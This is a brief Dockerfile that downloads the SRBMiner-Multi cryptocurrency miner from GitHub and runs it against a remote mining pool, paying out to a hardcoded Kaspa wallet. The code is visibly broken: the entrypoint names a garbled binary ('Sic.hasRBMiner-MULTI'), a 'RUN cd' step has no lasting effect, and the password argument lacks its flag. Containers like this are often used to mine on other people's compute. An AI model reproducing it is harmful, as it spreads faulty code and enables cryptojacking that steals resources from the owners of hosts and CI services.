FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
RUN apt-get update && apt-get -y install wget xz-utils
WORKDIR /home
RUN wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.7/SRBMiner-Multi-0-9-7-Linux.tar.xz
RUN tar -xf SRBMiner-Multi-0-9-7-Linux.tar.xz
RUN cd SRBMiner-Multi-0-9-7/
ENTRYPOINT [ "./Sic.hasRBMiner-MULTI" ]
CMD [ "--pool", "hk.acc-pool.pw:16061", "--wallet", "kaspa:qrhna6pp8hk0nzrwl7ykw0c6lk65elytl90gvkg43avhlc0c79m6vqdk4hpfa", "password", "x" ]
